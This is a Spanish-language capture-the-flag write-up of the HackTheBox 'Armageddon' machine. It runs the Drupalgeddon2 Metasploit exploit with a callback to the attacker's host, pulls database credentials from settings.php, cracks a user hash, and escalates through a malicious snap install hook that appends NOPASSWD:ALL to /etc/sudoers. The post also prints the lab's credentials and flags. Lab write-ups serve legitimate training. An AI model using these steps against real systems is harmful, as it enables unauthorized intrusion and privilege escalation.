+++ 
draft = false
date = 2025-11-25T23:27:52Z
title = "Armageddon Machine - HackTheBox"
description = "Esta es una máquina Linux de nivel fácil de la plataforma HackTheBox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Linux
----------------
# Enumeración Nmap
**Comando:**
```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.10.233 -oG allPorts
```

El escaneo nos da bastante información, vemos que el gestor de contenido es *drupal 7*, que posee el `/robots.txt` y nos muestra rutas bastante interesantes. 
Además la versión de SSH es vulnerable a user enum.

<img src="/images/Pasted image 20250929200824.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración puerto HTTP 80

Enumerando la página web, el archivo que contiene la versión en drupal es `/CHANGELOG.txt` , en versiones posteriores este archivo está oculto

Vemos que la versión de Drupal es 7.56 por lo cual buscaremos vulnerabilidades
<img src="/images/Pasted image 20250929201305.png" style="width:100%; height:auto; display:block; margin:auto;">
Utilizaremos searchsploit para buscar vulnerabilidades, vemos drupalgeddon2 en metasploit
**Comando:**
```bash
searchsploit 'drupal'
```
<img src="/images/Pasted image 20250929201928.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto iremos a msfconsole a probar el exploit con el siguiente comando
**Comando:**
```bash
msfconsole
msf > search drupal
```
Vemos drupalgeddon 2, utilizaremos la opción 6
<img src="/images/Pasted image 20250929202159.png" style="width:100%; height:auto; display:block; margin:auto;">
**Comando:**
```bash
msf > use 6
msf > set RHOSTS 10.10.10.233
msf > set LHOST 10.10.14.2
msf > set LPORT 4444
```
<img src="/images/Pasted image 20250929202409.png" style="width:100%; height:auto; display:block; margin:auto;">

Y finalmente le damos a run para correr el exploit y obtenemos una sessión en meterpreter, ahora ocupamos el comando `shell` para obtener una consola
<img src="/images/Pasted image 20250929202650.png" style="width:100%; height:auto; display:block; margin:auto;">

# Movimiento lateral

Obteniendo la consola vemos que es muy precaria, obtuvimos la consola con el usuario apache, el usuario al cual debemos migrar es `brucetherealadmin`
<img src="/images/Pasted image 20250929202813.png" style="width:100%; height:auto; display:block; margin:auto;">

En drupal el archivo `sites/default/settings.php` contiene datos importantes como las credenciales de la base de datos, por tanto procederemos a buscar el archivo
<img src="/images/Pasted image 20250929203240.png" style="width:100%; height:auto; display:block; margin:auto;">

Revisando el archivo obtenemos las siguientes credenciales `drupaluser:CQHEy@9M*m23gBVj`
<img src="/images/Pasted image 20250929203412.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora nos conectamos a la base de datos con las credenciales que obtuvimos con el siguiente comando
**Comando:**
```bash
mysql -u drupaluser -p -h localhost drupal
```
<img src="/images/Pasted image 20250929203547.png" style="width:100%; height:auto; display:block; margin:auto;">

Como la consola es precaria no nos muestra los datos, para solucionar esto utilizaremos el comando SQL y luego algún comando inexistente junto con ;
<img src="/images/Pasted image 20250929203644.png" style="width:100%; height:auto; display:block; margin:auto;">

Sabiendo el nombre de la base de datos, vemos las tablas de la base de datos drupal
<img src="/images/Pasted image 20250929203800.png" style="width:100%; height:auto; display:block; margin:auto;">
Encontramos la tabla `users`, por tanto mostraremos todos los valores dentro de esa tabla con el siguiente comando
```MYSQL
use drupal;
SELECT * FROM users;
error;
```
Obtenemos el hash `$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt` del usuario `brucetherealadmin`
<img src="/images/Pasted image 20250929204057.png" style="width:100%; height:auto; display:block; margin:auto;">

Lo guardaremos en hash.txt y utilizaremos john para cracker el hash, obteniendo la clave `booboo`
<img src="/images/Pasted image 20250929204210.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora nos conectamos por ssh al usuario `brucetherealadmin` con la contraseña `booboo`
```bash
ssh brucetherealadmin@10.10.10.233
```
<img src="/images/Pasted image 20250929204333.png" style="width:100%; height:auto; display:block; margin:auto;">

Obtenemos la flag user.txt 4a6ee9ea61135bdc7fa9495cdeb23c7f
<img src="/images/Pasted image 20250929204406.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Para elevar privilegios buscamos privilegios sudoers con sudo -l y encontramos que podemos utilizar snap como root
<img src="/images/Pasted image 20250929204515.png" style="width:100%; height:auto; display:block; margin:auto;">

Buscando en gtfobins encontramos que es posible escalar privilegios si tenemos permiso sudo en snap
<img src="/images/Pasted image 20250929204547.png" style="width:100%; height:auto; display:block; margin:auto;">

Siguiendo el paso a paso crearemos un packete para snap con fpm en nuestra máquina local, y posteriormente lo pasaremos hacia la máquina víctima

Seguimos tal cual el paso a paso
**Comando:**
```bash
COMMAND=id
mkdir -p snap/meta/hooks
cd snap
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
```
<img src="/images/Pasted image 20250929204836.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora utilizaremos nano para editar el comando que se correrá en la máquina víctima, en este caso le daremos permisos sudo para todo a nuestro usuario
**Comando:**
```bash
nano meta/hooks/install
```

Esto permitirá que utilice sudo su root para cambiarse al usuario root
```bash
echo "brucetherealadmin ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
```


Ahora le damos permiso de ejecución y creamos el archivo para pasarlo a la otra máquina
**Comando:**
```bash
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
<img src="/images/Pasted image 20250929205113.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora enviaremos el archivo xxxx_1.0_all.snap, primero hosteamos un servidor http con python3
<img src="/images/Pasted image 20250929205152.png" style="width:100%; height:auto; display:block; margin:auto;">

En la máquina víctima usamos curl para descargar el archivo
<img src="/images/Pasted image 20250929205304.png" style="width:100%; height:auto; display:block; margin:auto;">

Y ahora como aparece en gtfobins usaremos el comando adaptado a nuestro  sudo -l

```bash
sudo snap install * --dangerous --devmode
```

Una vez instalado hacemos sudo -l y vemos que tenemos permiso para todo sin contraseña
<img src="/images/Pasted image 20250929211332.png" style="width:100%; height:auto; display:block; margin:auto;">

Hacemos sudo su root y cambiamos al usuario root
<img src="/images/Pasted image 20250929211349.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora leemos la /root/root.txt y pwneamos la máquina
root.txt 3c1c704b2c52be33aec21343429d6b3a
<img src="/images/Pasted image 20250929211425.png" style="width:100%; height:auto; display:block; margin:auto;">
